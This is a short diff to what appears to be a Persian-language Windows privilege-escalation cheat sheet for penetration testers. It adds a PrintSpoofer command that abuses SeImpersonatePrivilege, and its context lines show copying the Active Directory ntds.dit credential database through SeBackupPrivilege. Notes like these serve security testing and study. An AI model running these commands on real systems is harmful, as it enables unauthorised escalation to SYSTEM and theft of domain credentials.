@@ -466,6 +466,13 @@ import-module .\SeBackupPrivilegeCmdLets.dll
 Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
 ```
 
+### ارتقا دسترسی با مجوز SeImpersonatePrivilege
+
+```text
+https://github.com/dievus/printspoofer
+printspoofer.exe -i -c "powershell -c whoami"
+```
+
 ### خواندن فایل ها بدون احراز هویت با diskshadow
 
 ```text
